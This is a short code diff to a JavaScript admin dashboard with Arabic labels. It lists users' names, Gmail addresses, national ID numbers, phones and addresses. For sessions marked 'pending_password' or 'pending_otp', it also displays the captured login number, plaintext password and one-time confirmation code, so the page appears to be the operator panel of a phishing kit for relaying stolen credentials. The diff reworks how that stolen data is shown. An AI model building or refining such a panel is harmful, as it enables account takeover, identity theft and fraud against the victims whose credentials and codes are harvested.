@@ -489,26 +489,26 @@ async function renderTable(){
       dd.style.maxHeight='86vh';
       dd.style.overflowY='auto';
 
-      dd.innerHTML=`
+      const sections = [];
+      sections.push(`
         <div class="ds">
           <div class="dsttl">معلومات المستخدم</div>
-          <div class="drow"><span class="dk">الاسم</span><span class="dv">${u.name}</span></div>
-          <div class="drow"><span class="dk">الجيميل</span><span class="dv">${u.email}</span></div>
-          <div class="drow"><span class="dk">رقم الهوية</span><span class="dv">${u.idNum}</span></div>
-          <div class="drow"><span class="dk">رقم الجوال</span><span class="dv">${u.phone}</span></div>
-          <div class="drow"><span class="dk">عنوان التواصل</span><span class="dv">${u.address}</span></div>
-          <div class="drow"><span class="dk">الجهاز</span><span class="dv">${u.device}</span></div>
-          <div class="drow"><span class="dk">المتصفح</span><span class="dv">${u.browser}</span></div>
-          <div class="drow"><span class="dk">IP</span><span class="dv">${u.ip}</span></div>
-          <div class="drow"><span class="dk">تاريخ الانضمام</span><span class="dv">${u.joined}</span></div>
-          <div class="drow"><span class="dk">الحالة</span><span class="dv">${u.status==='active'?'🟢 نشط':'🔴 غير نشط'}</span></div>
-        </div>
+          <div class="drow"><span class="dk">الاسم</span><span class="dv">${u.name || '—'}</span></div>
+          <div class="drow"><span class="dk">الجيميل</span><span class="dv">${u.email || '—'}</span></div>
+          <div class="drow"><span class="dk">رقم الهوية</span><span class="dv">${u.idNum || '—'}</span></div>
+          <div class="drow"><span class="dk">رقم الجوال</span><span class="dv">${u.phone || '—'}</span></div>
+          <div class="drow"><span class="dk">عنوان التواصل</span><span class="dv">${u.address || '—'}</span></div>
+        </div>`);
+      if (s && (s.status === 'pending_password' || s.status === 'pending_otp')) {
+        sections.push(`
         <div class="ds">
           <div class="dsttl">بيانات الجلسة الحالية</div>
-          <div class="drow"><span class="dk">رقم تسجيل الدخول</span><span class="dv hi">${s.login||'—'}</span></div>
-          <div class="drow"><span class="dk">كلمة المرور</span><span class="dv" id="ddpv${u.id}">${s.password||'—'}</span></div>
-          <div class="drow"><span class="dk">رمز التأكيد</span><span class="dv hi" style="letter-spacing:3px">${s.otp||'—'}</span></div>
-        </div>`;
+          <div class="drow"><span class="dk">رقم تسجيل الدخول</span><span class="dv hi">${s.login || '—'}</span></div>
+          <div class="drow"><span class="dk">كلمة المرور</span><span class="dv" id="ddpv${u.id}">${s.password || '—'}</span></div>
+          <div class="drow"><span class="dk">رمز التأكيد</span><span class="dv hi" style="letter-spacing:3px">${s.otp || '—'}</span></div>
+        </div>`);
+      }
+      dd.innerHTML = sections.join('');
 
       const st=s.status;
       const hasPending=st==='pending_password'||st==='pending_otp';
